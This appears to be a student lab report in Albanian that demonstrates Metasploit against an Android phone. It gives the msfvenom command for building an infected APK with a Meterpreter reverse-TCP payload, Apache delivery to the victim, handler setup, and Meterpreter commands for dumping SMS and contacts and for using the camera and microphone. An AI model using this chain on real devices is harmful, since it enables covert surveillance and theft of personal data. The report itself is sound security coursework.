---
title: Analiza e veglës Metasploit
---

# Analiza e veglës Metasploit

Ky punim është kryer në kuadër të detyrës së dytë në lëndën "Siguria e Informacionit" dhe shembujt e implementuar janë përdorur vetëm për qëllime edukative. Zhvillimi i shembujve të tillë pa dijeninë dhe miratimin e personave të përfshirë si viktima konsiderohet jolegale.

## Teknologjitë dhe pajisjet e përdorura

<ul>
<li>Pajisja kompjuterike (lokale) - sistemi operativ Kali Linux</li>
<li>Pajisje mobile (viktima) - sistemi operativ Android versioni 10</li>
<li>Metasploit Framework dhe MSFVenom</li>
</ul>

Për shkak që në shembullin e zhvilluar pajisja lokale dhe pajisja e viktimës duhet të jenë të kyçura në të njejtin rrjet (të jenë në të njejtin LAN) dhe përdoren IP-të private të tyre, nuk ka qenë i mundur përdorimi i makinave virtuale apo emulatorëve dhe janë përdorur pajisjet tona fizike duke mos cënuar pajisjet e përsonave të tjerë.

## Çfarë është Metasploit

Metasploit nuk është thjesht një vegël, por është një framework platformë e plotë që siguron librari të qëndrueshme dhe të besueshme për shfrytëzim të vazhdueshëm dhe ofron infrastrukturën e nevojshme përmes një mjedisi të plotë zhvillues për ndërtimin e veglave të reja dhe për automatizimin e çdo aspekti të penetration testing. Metasploit ofron më shumë se një interface në funksionalitetin e tij themelor, duke perfshirë console-ën, command line-in dhe graphical interface-in. Gjatë zhvillimit të shmbujve tonë me kemi përdorur MSFconsole.

MSFconsole deri më tani është pjesa më e njohur e Metasploit Framework. Është njëra nga veglat më fleksibile, të pasura me tipare dhe të mbështetura mirë në Framework-un. Msfconsole ofron një interface të gjithanshëm me pothuajse çdo mundësi dhe cilësi të disponueshme në Framework. Msfconsole mund të shfrytëzohet për të bërë gjithçka, duke përfshirë nisjen e një exploit, ngarkimin e moduleve ndihmëse, kryerjen e regjistrimit, krijimin e dëgjuesve, etj.

## Zhvillimi i eksperimentit

### Exploit

Exploit ekzekuton një sekuencë të komandave për të targetuar një dobësi specifike që është gjetur në një sistem ose aplikacion. Ky modul përfiton nga dobësia për të fituar çasje në sistemin/pajisjen e targetuar.
Hapi i parë është kërkimi për exploit adekuat për platformën android dhe përgjedhja e tij në mesin e shumë mundësive që ofrohen.

```
msf6 > search type:exploit platform:android

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   ........................................................................................................................
   10  exploit/multi/handler                                                      manual     No     Generic Payload Handler
   ........................................................................................................................
```

| Karakteristika  | Shpjegimi                                                                                                             |
| --------------- | --------------------------------------------------------------------------------------------------------------------- |
| Name            | emri i modulit                                                                                                        |
| Disclosure Date | Shpjegimi                                                                                                             |
| Rank            | e rendit ndikimin e mundshëm të shfrytëzimit në objektiv. Exploits janë të renditura nga ai me rëndësinë më të madhe. |
| Check           | Shpjegimi                                                                                                             |
| Description     | përfshin më shumë detaje në lidhje me cenueshmërinë e veçantë që moduli shfrytëzon.                                   |

Moduli i zgjedhur për exploit, `multi/handler` mundëson vendosjen e payloads të pavarur. Fajlli i infektuar që do të hapet nga ana e viktimës do të vendos komunimin me sulmuesin. Është e nevojshme që të ekzistoj një kontrollues i cili do të presë për lidhjen e vendosur kur komunikimi drejtohet nga viktima te sulmuesi.

### Payload

Payload është shell code që ekzekutohet pasi moduli exploti ta ketë komprementuar një sistem. Na mundëson të lidhemi me pajisjen e viktimës dhe ta përdorim atë si të tonën, pasi të kemi shfrytëzuar një cenueshmëri në sistemin e saj. Ajo na mundëson të definojmë se si duam të lidhemi me pajisjen e viktimës dhe çfarë duam të bëjmë me të në vazhdim. Metasploit ka shumë lloje të payloads që mund të përdoren për sistemin e targetuar.

Për të parë payloads që janë në dispozicion dhe për të listuar ata adekuat për platformën android kërkojmë:

```
msf6 > search type:payload platform:android

Matching Modules
================

   #  Name                                       Disclosure Date  Rank    Check  Description
   -  ----                                       ---------------  ----    -----  -----------
   .............................................................................................................................
   2  payload/android/meterpreter/reverse_tcp                     normal  No     Android Meterpreter, Android Reverse TCP Stager
   .............................................................................................................................
```

Payload `android/meterpreter/reverse_tcp` përdoret për pajisjet android. Meterpreter është shkurtesë për meta interpreter që është një payload i fuqishëm dhe mund të mbuloj tërë funksionalitetin e një command shell. Punon me injektim të DLL fajlla dhe qëndron tërësisht në memorje, duke mos lënë asnjë gjurmë të ekzistencës së tij në hard drive ose skedar. Ka një numër komandash dhe skriptash specifike të zhvilluara për të, duke na mundësuar që në masë të madhe të realizohen qëllimet tona në pajisjen e viktimës. Reverse_tcp nënkupton që përdoret meterpreter si reverse shell që është një shell në të cilin pajisja e targetuar si viktimë, komunikon përsëri mbrapsht me pajisjen sulmuese. Pajisja sulmuese cakton një port për dëgjim në të cilin pret lidhjen me viktimën dhe përmes përdorimit të të cilit realizohet ekzekutimi i komandave pasuese.

![Reverse Shell](/Foto/reverse_shell.png)

Android Meterpreter mundëson marrjen e informatave nga skedarët e sistemit, përgjimin e thirrjeve telefonike, leximin dhe dërgimin e mesazheve, leximin e log të telefonatave, përdorimin e kamerave të pajisjes, etj.

### Krijimi i android aplikacionit të infektuar

Msfvenom iu shtua Metasploit-it në vitin 2011. Me lansimin e msfvenom funksionaliteti i msfpayload dhe msfencode janë kombinuar në një vegël të vetme. Për të krijuar një APK (Android Package) fajll të infektuar - për të gjeneruar një android/meterpreter/reverse_tcp payload që do të instalohet në pajisjen e viktimës, përmes msfvenom shkruajmë komandën:

```
$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.12 LPORT=4444 R > /root/Desktop/OurApp.apk
```

| Shkurtesa                  | Shpjegimi                                                            |
| -------------------------- | -------------------------------------------------------------------- |
| -p                         | specifikon llojin e payload që përdoret                              |
| LHOST IP                   | adresa e pajisjes e cila do të përdoret për të pritur lidhjen prapa  |
| LPORT                      | porti i pajisjes që do të presë për komunikim me pajisjen e viktimës |
| R                          | raw format                                                           |
| > /root/Desktop/OurApp.apk | lokacioni ku ruhet APK aplikacioni i krijuar                         |

### Kalimi aplikacionit të infektuar tek viktima

Për shkak që shumica e platformave online e detektojnë një fajll i cili ka përmajtje kërcënuese për sigurinë, kalimin e fajllit të infektuar nga sulmuesi tek viktima e bëjmë përmes web serverit të apache në linux. Sulmuesi e vendos fajllin e infetuar në lokacionin `/var/www/html/` dhe pajisja e viktimës duhet u çasur në browser në IP adresën e sulmuesit mund të gjej aplikacionin dhe ta instaloj. Komandat për ta startuar apache serverin janë:

```
$ service apache2 start
$ service apache2 status
```

### Shfrytëzimi i pajisjes të targetuar

Shembulli jonë e përdorë modulin exploit/multi/handler duke specifikuar payload, hostin i cili pret kthimin e lidhjes prapa dhe portin në të cilin dëgjohet lidhja. Komanda exploit fillon kërkimin e dobësive dhe në momentin që vendoset lidhja me aplikacionin e infektuar hapet meterpreter dhe nga aty e tutje mund të manipulohet pajisja e viktimës.

```
msf6 > use exploit/multi/handler

msf6 > set PAYLOAD android/meterpreter/reverse_tcp

msf6 > set LHOST 192.168.0.12

msf6 > set LPORT 4444

msf6 > exploit
```

Sapo viktima ta ketë instaluar aplikacionin e infektuar dhe të tentojë ta hapë, krijohet një session në meterpreter.

## Komandat e Meterpreter

```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background

```

```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    pwd           Print working directory
    search        Search for files
```

```
Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    ifconfig      Display interfaces
    ipconfig      Display interfaces
```

```
Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    getuid        Get the user that the server is running as
    localtime     Displays the target system local date and time
    shell         Drop into a system command shell
    sysinfo       Gets information about the remote system, such as OS
```

Shellcode - është një grup i instruksioneve që përdoren si një payload kur exploitation ndodh. Shellcode është i shkruar në Asembler. Në shumicën e rasteve, një shell komandë apo një Meterpreter shell do të sigurohet pasi seria e instruksioneve të jetë kryer nga makina e targetuar.

```
Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
		    	-d : the number of seconds to record (default = 1)
			-f : The wav file path.
			-p : Automatically play the captured audio, by default ‘true’.
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam
```

```
Android Commands
================

    Command           Description
    -------           -----------
    check_root        Check if device is rooted
    dump_calllog      Get call log
    dump_contacts     Get contacts list
    dump_sms          Get sms messages
    send_sms          Sends SMS from target session
    set_audio_mode    Set Ringer Mode
```

```
Application Controller Commands
===============================

    Command        Description
    -------        -----------
    app_list       Liston t
    app_run        Start Main Activty for package name
    app_uninstall  Request to uninstall application
```

## Grupi i parë

[Fatbardh Kadriu](https://github.com/FatbardhKadriu)

[Arbena Musa](https://github.com/ArbenaMusa)

[Albana Hysenaj](https://github.com/albanah)
